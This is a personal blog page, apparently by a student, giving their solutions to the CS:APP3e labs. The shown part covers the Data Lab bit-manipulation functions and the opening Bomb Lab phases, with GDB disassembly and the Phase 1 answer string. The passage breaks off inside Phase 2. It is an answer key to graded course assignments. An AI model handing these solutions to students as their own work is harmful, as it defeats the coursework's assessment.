

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/Avatarsi.jpg">
  <link rel="icon" href="/img/Avatarsi.jpg">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Steven Gong">
  <meta name="keywords" content="">
  
    <meta name="description" content="很早就写完了，抽空贴到个人主页上来，免得质量堪忧的美帝良心电脑挂了找不到。其他的实验记录也会陆续上传。 实验资料可从此获取：Lab Assignments 受限于篇幅，本文已删除没有任何意义的评测结果，由于PerfLab缺乏评分标准并且性能与使用的机种高度相关，题解也缺乏参考价值。笔者的题解除了Malloc Lab以外均为满分，Malloc Lab的高分题解网上也有不少。 然而精简后的题解仍然非常">
<meta property="og:type" content="article">
<meta property="og:title" content="CS:APP3e个人题解">
<meta property="og:url" content="https://sgong-0224.github.io/CSAPP3e_WP/index.html">
<meta property="og:site_name" content="sgong&#39;s homepage">
<meta property="og:description" content="很早就写完了，抽空贴到个人主页上来，免得质量堪忧的美帝良心电脑挂了找不到。其他的实验记录也会陆续上传。 实验资料可从此获取：Lab Assignments 受限于篇幅，本文已删除没有任何意义的评测结果，由于PerfLab缺乏评分标准并且性能与使用的机种高度相关，题解也缺乏参考价值。笔者的题解除了Malloc Lab以外均为满分，Malloc Lab的高分题解网上也有不少。 然而精简后的题解仍然非常">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://sgong-0224.github.io/CSAPP3e_WP/image-20240125173348841-172450350911111.png">
<meta property="og:image" content="https://sgong-0224.github.io/CSAPP3e_WP/image-20240125104109016-172450351282313.png">
<meta property="og:image" content="https://sgong-0224.github.io/CSAPP3e_WP/image-20240125114931654-172450352160215.png">
<meta property="og:image" content="https://sgong-0224.github.io/CSAPP3e_WP/image-20240125115105490-172450352338817.png">
<meta property="og:image" content="https://sgong-0224.github.io/CSAPP3e_WP/image-20240125154321644-17245034799789.png">
<meta property="og:image" content="https://sgong-0224.github.io/CSAPP3e_WP/image-20240125163456712-17245034740287.png">
<meta property="og:image" content="https://sgong-0224.github.io/CSAPP3e_WP/image-20240125163756124-17245034725135.png">
<meta property="og:image" content="https://sgong-0224.github.io/CSAPP3e_WP/image-20240125171715694-17245034630081.png">
<meta property="og:image" content="https://sgong-0224.github.io/CSAPP3e_WP/image-20240125175347829-17245034644793.png">
<meta property="og:image" content="https://sgong-0224.github.io/CSAPP3e_WP/image-20240129095931505-172450353221319.png">
<meta property="og:image" content="https://sgong-0224.github.io/CSAPP3e_WP/image-20240130112206290-172450353894821.png">
<meta property="og:image" content="https://sgong-0224.github.io/CSAPP3e_WP/image-20240130103617334-172450354200723.png">
<meta property="og:image" content="https://sgong-0224.github.io/CSAPP3e_WP/image-20240130104635910-172450354535525.png">
<meta property="og:image" content="https://sgong-0224.github.io/CSAPP3e_WP/image-20240130104730781-172450354929327.png">
<meta property="og:image" content="https://sgong-0224.github.io/CSAPP3e_WP/image-20240130104906410-172450356093629.png">
<meta property="og:image" content="https://sgong-0224.github.io/CSAPP3e_WP/image-20240130104938970-172450356436831.png">
<meta property="og:image" content="https://sgong-0224.github.io/CSAPP3e_WP/image-20240131144006809-172450356875933.png">
<meta property="og:image" content="https://sgong-0224.github.io/CSAPP3e_WP/image-20240131165552508-172450357635835.png">
<meta property="og:image" content="https://sgong-0224.github.io/CSAPP3e_WP/image-20240202145227226-172450357943937.png">
<meta property="og:image" content="https://sgong-0224.github.io/CSAPP3e_WP/image-20240202164732726-172450358245639.png">
<meta property="og:image" content="https://sgong-0224.github.io/CSAPP3e_WP/image-20240202170120119-172450358557541.png">
<meta property="article:published_time" content="2024-08-24T12:45:00.000Z">
<meta property="article:modified_time" content="2024-09-23T08:05:46.991Z">
<meta property="article:author" content="Steven Gong">
<meta property="article:tag" content="计算机基础">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://sgong-0224.github.io/CSAPP3e_WP/image-20240125173348841-172450350911111.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>CS:APP3e个人题解 - sgong&#39;s homepage</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  



  
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"sgong-0224.github.io","root":"/","version":"1.9.6","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":true,"trickleSpeed":100}},"code_language":{"enable":false,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"left","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"loading_img":"/img/loading.gif","onlypost":true,"offset_factor":6},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>sgong&#39;s homepage</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/music/" target="_self">
                <i class="iconfont icon-music"></i>
                <span>今日歌单</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>类别</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/remark/" target="_self">
                <i class="iconfont icon-speakernotes"></i>
                <span>留言板</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle">CS:APP3e个人题解</span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-08-24 20:45" pubdate>
          2024年8月24日 20:45
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          <!-- compatible with older versions-->
          4.1k字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          <!-- compatible with older versions-->
          预计阅读时长：18分钟 
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="padding-left: 2rem; margin-right: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">CS:APP3e个人题解</h1>
            
            
              <div class="markdown-body">
                
                <p>很早就写完了，抽空贴到个人主页上来，免得质量堪忧的美帝良心电脑挂了找不到。其他的实验记录也会陆续上传。</p>
<p>实验资料可从此获取：<a target="_blank" rel="noopener" href="https://csapp.cs.cmu.edu/3e/labs.html">Lab Assignments</a></p>
<p>受限于篇幅，本文已删除没有任何意义的评测结果，由于PerfLab缺乏评分标准并且性能与使用的机种高度相关，题解也缺乏参考价值。笔者的题解除了Malloc Lab以外均为满分，Malloc Lab的高分题解网上也有不少。</p>
<p>然而精简后的题解仍然非常长，可点击各部分标题跳转。</p>
<h2 id="1-Data-Lab-位运算大法好，再也不碰了"><a href="#1-Data-Lab-位运算大法好，再也不碰了" class="headerlink" title="1. Data Lab: 位运算大法好，再也不碰了"></a>1. Data Lab: 位运算大法好，再也不碰了</h2><p>满满的都是trick，日常编程中没多大用。</p>
<h3 id="bitXor"><a href="#bitXor" class="headerlink" title="bitXor"></a>bitXor</h3><p>由德摩根律，<code>x^y = (~x)&amp;y | x&amp;(~y) = ~( (~((~x)&amp;y)) &amp; (~(x&amp;(~y))) )</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">bitXor</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span> &#123;<br>  <span class="hljs-keyword">return</span> ~( (~((~x)&amp;y)) &amp; (~(x&amp;(~y))) );<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h3><p>返回最小的二进制补码整数，该数为<code>0x80000000</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">tmin</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="isTmax"><a href="#isTmax" class="headerlink" title="isTmax"></a>isTmax</h3><p>判断<code>x</code>是否为最大整数<code>0x7fffffff</code>。</p>
<p>该数取反和加一得到的结果相等，且结果不为0，可用<code>!!(x+1)</code>判断。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">isTmax</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>  <span class="hljs-keyword">return</span> !((~x)^(x+<span class="hljs-number">1</span>)) &amp; !!(x+<span class="hljs-number">1</span>) ;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="allOddBits"><a href="#allOddBits" class="headerlink" title="allOddBits"></a>allOddBits</h3><p>判断奇数位是否均为1。</p>
<p>构造<code>0xaaaaaaaa</code>和输入按位与，再和<code>0xaaaaaaaa</code>按位异或检查奇数位。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">allOddBits</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>  <span class="hljs-type">int</span> mask = <span class="hljs-number">0xaa</span>;<br>  mask = mask | mask&lt;&lt;<span class="hljs-number">8</span> ;<br>  mask = mask | mask&lt;&lt;<span class="hljs-number">16</span>;<br>  <span class="hljs-keyword">return</span> !((mask&amp;x)^mask);<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h3><p>取反加一即可。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">negate</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>  <span class="hljs-keyword">return</span> ~x+<span class="hljs-number">1</span> ;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="isAsciiDigit"><a href="#isAsciiDigit" class="headerlink" title="isAsciiDigit"></a>isAsciiDigit</h3><p>只要<code>x</code>减去<code>0x30</code>与<code>0x39</code>减去<code>x</code>最高位均为0即可。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">isAsciiDigit</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>  <span class="hljs-type">int</span> min=<span class="hljs-number">0x30</span>,max=<span class="hljs-number">0x39</span>,mask=<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>;<br>  <span class="hljs-keyword">return</span> (!((x+~min+<span class="hljs-number">1</span>)&amp;mask)) &amp; !((max+~x+<span class="hljs-number">1</span>)&amp;mask);<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="conditional"><a href="#conditional" class="headerlink" title="conditional"></a>conditional</h3><p><code>x</code>为0时返回<code>z</code>，否则返回<code>y</code>。构造出相应情况下的<code>0x0</code>与<code>0xffffffff</code>，分别和<code>y</code>,<code>z</code>按位与。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">conditional</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y, <span class="hljs-type">int</span> z)</span> &#123;<br>  <span class="hljs-keyword">return</span> (y &amp; ((!!x)&lt;&lt;<span class="hljs-number">31</span>)&gt;&gt;<span class="hljs-number">31</span> )|(z &amp; ((!x)&lt;&lt;<span class="hljs-number">31</span>)&gt;&gt;<span class="hljs-number">31</span> );<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="isLessOrEqual"><a href="#isLessOrEqual" class="headerlink" title="isLessOrEqual"></a>isLessOrEqual</h3><p><code>x</code>,<code>y</code>相减判断是否为负，计算<code>!((y+~x+1)&amp;(1&lt;&lt;31))</code>，下面考虑溢出。</p>
<p>若<code>x</code>为负，<code>y</code>非负返回1，要求<code>!(y&gt;&gt;31)</code>和<code>!!(x&gt;&gt;31)</code>为真。</p>
<p>若<code>y</code>为负，<code>x</code>非负返回0。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">isLessOrEqual</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span> &#123;<br>  <span class="hljs-keyword">return</span>  (!!(x&gt;&gt;<span class="hljs-number">31</span>)&amp;!(y&gt;&gt;<span class="hljs-number">31</span>)) | ( (!((y+~x+<span class="hljs-number">1</span>)&amp;(<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>))) &amp; (!!(x&gt;&gt;<span class="hljs-number">31</span>)|!(y&gt;&gt;<span class="hljs-number">31</span>)) ) ;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="logicalNeg"><a href="#logicalNeg" class="headerlink" title="logicalNeg"></a>logicalNeg</h3><p>按位或直到所有数位都计算过，0保持不变，非零数变为<code>0xffffffff</code>，对结果+1即为返回值。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">logicalNeg</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>  x = x&lt;&lt;<span class="hljs-number">16</span> | x;<br>  x = x&lt;&lt;<span class="hljs-number">8</span>  | x;<br>  x = x&lt;&lt;<span class="hljs-number">4</span>  | x;<br>  x = x&lt;&lt;<span class="hljs-number">2</span>  | x;<br>  x = x&lt;&lt;<span class="hljs-number">1</span>  | x;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>+(x&gt;&gt;<span class="hljs-number">31</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="howManyBits"><a href="#howManyBits" class="headerlink" title="howManyBits"></a>howManyBits</h3><p>0只需要1位来表示。</p>
<p>对非零值，若为正数，不断进行二分查找并判断高位是否有1，将结果相加后加上符号位所用的1位即为返回值。负数取反后同样处理。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">howManyBits</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>  <span class="hljs-type">int</span> allZ=!x;<br>  <span class="hljs-type">int</span> h16,h8,h4,h2,h1,h0,sum;<br>  <br>  x = (x&gt;&gt;<span class="hljs-number">31</span>)^x;<br>  h16 = !!(x&gt;&gt;<span class="hljs-number">16</span>)&lt;&lt;<span class="hljs-number">4</span>;<br>  x = x&gt;&gt;h16;<br><br>  h8 = !!(x&gt;&gt;<span class="hljs-number">8</span>)&lt;&lt;<span class="hljs-number">3</span>;<br>  x = x&gt;&gt;h8;<br>  <br>  h4 = !!(x&gt;&gt;<span class="hljs-number">4</span>)&lt;&lt;<span class="hljs-number">2</span>;<br>  x = x&gt;&gt;h4;<br>  <br>  h2 = !!(x&gt;&gt;<span class="hljs-number">2</span>)&lt;&lt;<span class="hljs-number">1</span>;<br>  x = x&gt;&gt;h2;<br>  <br>  h1 = !!(x&gt;&gt;<span class="hljs-number">1</span>);<br>  x = x&gt;&gt;h1;<br>  <br>  h0 = x;<br>  sum = h16+h8+h4+h2+h1+h0+<span class="hljs-number">1</span>;<br>  <br>  <span class="hljs-keyword">return</span> allZ | sum&amp;(((!allZ)&lt;&lt;<span class="hljs-number">31</span>)&gt;&gt;<span class="hljs-number">31</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="floatScale2"><a href="#floatScale2" class="headerlink" title="floatScale2"></a>floatScale2</h3><p>拆分输入，再判断特殊值、非规格化、规格化(溢出、不溢出)的情况即可。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-title function_">floatScale2</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> uf)</span> &#123;<br>  <span class="hljs-type">int</span> sig=(<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>)&amp;uf;<br>  <span class="hljs-type">int</span> <span class="hljs-built_in">exp</span>=(uf&gt;&gt;<span class="hljs-number">23</span>)&amp;<span class="hljs-number">0xff</span>;<br>  <span class="hljs-type">int</span> frac=uf&amp;<span class="hljs-number">0x7fffff</span>;<br>  <span class="hljs-keyword">if</span>(<span class="hljs-built_in">exp</span>==<span class="hljs-number">0xff</span>||(!<span class="hljs-built_in">exp</span>)&amp;&amp;!frac)<span class="hljs-keyword">return</span> uf;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">exp</span>)&#123;<br>    frac=frac&lt;&lt;<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> sig|frac;<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-built_in">exp</span>==<span class="hljs-number">0xff</span><span class="hljs-number">-1</span>)&#123;<br>   <span class="hljs-built_in">exp</span>=<span class="hljs-number">0xff</span>;<br>   frac=<span class="hljs-number">0</span>;<br>   <span class="hljs-keyword">return</span> sig|<span class="hljs-built_in">exp</span>&lt;&lt;<span class="hljs-number">23</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> sig|(<span class="hljs-built_in">exp</span>+<span class="hljs-number">1</span>)&lt;&lt;<span class="hljs-number">23</span>|(frac&amp;<span class="hljs-number">0x7fffff</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="floatFloat2Int"><a href="#floatFloat2Int" class="headerlink" title="floatFloat2Int"></a>floatFloat2Int</h3><p>浮点数转整型，1.frac*2^(exp-127)，exp&gt;&#x3D;158时溢出，exp&lt;127时为0。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">floatFloat2Int</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> uf)</span> &#123;<br>  <span class="hljs-type">int</span> sig=(<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>)&amp;uf;<br>  <span class="hljs-type">int</span> <span class="hljs-built_in">exp</span>=(uf&gt;&gt;<span class="hljs-number">23</span>)&amp;<span class="hljs-number">0xff</span>;<br>  <span class="hljs-type">int</span> frac=uf&amp;<span class="hljs-number">0x7fffff</span>;<br>  <span class="hljs-keyword">if</span>(<span class="hljs-built_in">exp</span>&gt;=<span class="hljs-number">127</span>&amp;&amp;<span class="hljs-built_in">exp</span>&lt;<span class="hljs-number">158</span>)<span class="hljs-keyword">return</span>(sig|(<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">30</span>)|(frac&lt;&lt;<span class="hljs-number">7</span>))&gt;&gt;(<span class="hljs-number">157</span>-<span class="hljs-built_in">exp</span>);<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-built_in">exp</span>&lt;<span class="hljs-number">127</span>)<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-number">0x80000000</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="floatPower2"><a href="#floatPower2" class="headerlink" title="floatPower2"></a>floatPower2</h3><p>返回以浮点数表示的2.0^x。x&gt;127时返回NaN，x&lt;-149时返回0。</p>
<p>非规格化：计算尾数为1&lt;&lt;(x+149)。</p>
<p>规格化：尾数为0，计算指数为(x+127)，左移23位。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-title function_">floatPower2</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>  <span class="hljs-keyword">if</span> (x &gt; <span class="hljs-number">127</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0x7f800000</span>;<br>  <span class="hljs-keyword">if</span> (x &gt;= <span class="hljs-number">-126</span>) <span class="hljs-keyword">return</span> (x+<span class="hljs-number">127</span>)&lt;&lt;<span class="hljs-number">23</span>;<br>  <span class="hljs-keyword">if</span> (x &gt;= <span class="hljs-number">-149</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>&lt;&lt;(x+<span class="hljs-number">149</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>



<h2 id="2-Bomb-Lab-拆个炸弹玩玩"><a href="#2-Bomb-Lab-拆个炸弹玩玩" class="headerlink" title="2. Bomb Lab: 拆个炸弹玩玩"></a>2. Bomb Lab: 拆个炸弹玩玩</h2><h3 id="Phase-1"><a href="#Phase-1" class="headerlink" title="Phase 1"></a>Phase 1</h3><p>GDB执行<code>disas phase_1</code>，获得汇编代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x0000000000400ee0 &lt;+0&gt;:     sub    $0x8,%rsp<br>0x0000000000400ee4 &lt;+4&gt;:     mov    $0x402400,%esi<br>0x0000000000400ee9 &lt;+9&gt;:     call   0x401338 &lt;strings_not_equal&gt;<br>0x0000000000400eee &lt;+14&gt;:    test   %eax,%eax<br>0x0000000000400ef0 &lt;+16&gt;:    je     0x400ef7 &lt;phase_1+23&gt;<br>0x0000000000400ef2 &lt;+18&gt;:    call   0x40143a &lt;explode_bomb&gt;<br>0x0000000000400ef7 &lt;+23&gt;:    add    $0x8,%rsp<br>0x0000000000400efb &lt;+27&gt;:    ret<br></code></pre></td></tr></table></figure>

<p>利用<code>x /s 0x402400</code>查看<code>0x402400</code>处的字符串，得到正确输入**Border relations with Canada have never been better.**：</p>
<p><img src="/CSAPP3e_WP/image-20240125173348841-172450350911111.png" style="zoom: 67%;" align="left"></p>



<h3 id="Phase-2"><a href="#Phase-2" class="headerlink" title="Phase 2"></a>Phase 2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x0000000000400efc &lt;+0&gt;:     push   %rbp<br>0x0000000000400efd &lt;+1&gt;:     push   %rbx<br>0x0000000000400efe &lt;+2&gt;:     sub    $0x28,%rsp<br>0x0000000000400f02 &lt;+6&gt;:     mov    %rsp,%rsi<br>0x0000000000400f05 &lt;+9&gt;:     call   0x40145c &lt;read_six_numbers&gt;<br>0x0000000000400f0a &lt;+14&gt;:    cmpl   